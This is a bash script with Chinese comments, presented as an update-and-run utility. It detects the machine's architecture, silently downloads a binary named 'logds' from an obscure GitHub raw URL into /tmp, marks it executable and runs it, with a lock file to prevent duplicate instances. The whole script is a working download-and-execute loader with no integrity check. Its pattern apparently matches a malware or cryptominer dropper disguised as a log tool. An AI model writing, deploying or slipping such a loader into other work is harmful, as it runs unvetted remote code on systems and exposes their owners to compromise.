#!/bin/bash

# 脚本路径：/root/update_and_run.sh
# 功能：根据架构下载对应文件，保存为 /tmp/logds 并执行

URL="https://raw.githubusercontent.com/kriede-hue/luyqo/main"
TMP_FILE="/tmp/logds"
LOG_FILE="/tmp/logds.log"
LOCK_FILE="/tmp/update_and_run.lock"

# 防止脚本重复运行
if [ -f "$LOCK_FILE" ]; then
    echo "$(date): 已有实例在运行，退出" >> "$LOG_FILE"
    exit 0
fi
trap "rm -f $LOCK_FILE" EXIT
touch "$LOCK_FILE"

# 获取架构
ARCH=$(uname -m)

# 根据架构选择远程文件
case "$ARCH" in
    x86_64)
        REMOTE_FILE="logds"
        ;;
    aarch64|armv7l|armv6l)
        REMOTE_FILE="logds_arm"
        ;;
    *)
        echo "$(date): 不支持的架构: $ARCH" >> "$LOG_FILE"
        exit 1
        ;;
esac

# 下载并运行
echo "$(date): 正在下载 $REMOTE_FILE (架构: $ARCH)" >> "$LOG_FILE"

if curl -s -o "$TMP_FILE" "$URL/$REMOTE_FILE" && chmod +x "$TMP_FILE"; then
    echo "$(date): 成功下载并设置权限: $REMOTE_FILE -> $TMP_FILE" >> "$LOG_FILE"
    "$TMP_FILE" >> "$LOG_FILE" 2>&1
else
    echo "$(date): 下载或设置权限失败: $URL/$REMOTE_FILE" >> "$LOG_FILE"
    exit 1
fi

# 清理锁（由 trap 自动处理）